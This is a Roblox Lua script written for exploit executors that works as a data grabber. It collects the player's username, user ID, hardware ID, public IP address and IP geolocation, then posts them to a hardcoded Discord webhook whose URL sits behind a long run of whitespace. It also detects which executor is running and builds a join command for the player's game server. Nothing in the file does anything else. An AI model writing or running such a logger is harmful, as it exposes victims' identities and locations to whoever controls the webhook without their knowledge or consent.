local LocalPlayer = game:GetService("Players").LocalPlayer




--Player Info
local DName = game.Players.LocalPlayer.DisplayName  -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId
local Countiry = game.LocalizationService.RobloxLocaleId -- Country
local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

--GameInfo
local GAMENAME = nil

local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or (secure_load and "Sentinel") or (pebc_execute and "ProtoSmasher") or (KRNL_LOADED and "Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "Script-Ware") or ("Unsupported")

--With Logo-- local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "<:synapsex:991095647186845696> Synapse X") or (secure_load and "<:Sentiel:991103465248002179> Sentinel") or (pebc_execute and "<:ProtoSmasher:991101951766970539> ProtoSmasher") or (KRNL_LOADED and "<:krnl:991095457977610310> Krnl") or (is_sirhurt_closure and "SirHurt") or (identifyexecutor():find("ScriptWare") and "<:ScriptWare:991098705157435414> Script-Ware") or ("Unsupported")

-- Use the secret in your code


local url =                                                                                                                                                                                                                                                     "https://discord.com/api/webhooks/1117918885786681374/9B-qqDBBlKTbq0KW1_D9978_oXom0dN6K3BbXg3y-GLBXxrIbGLxBbP5r4GBJ2_Ecsix"

local data = {
   ["avatar_url"] = "",
   ["content"] = "",
   ["embeds"] = {
       {
     
      ["author"] = {
      ["name"] = "( Someone Logged Into DataBase )",
      ["url"] = "https://roblox.com",
    },
        
           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Exploit:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
           ["type"] = "rich",
           ["color"] = tonumber(0xFF0000),
   ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
            }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
wait(1)
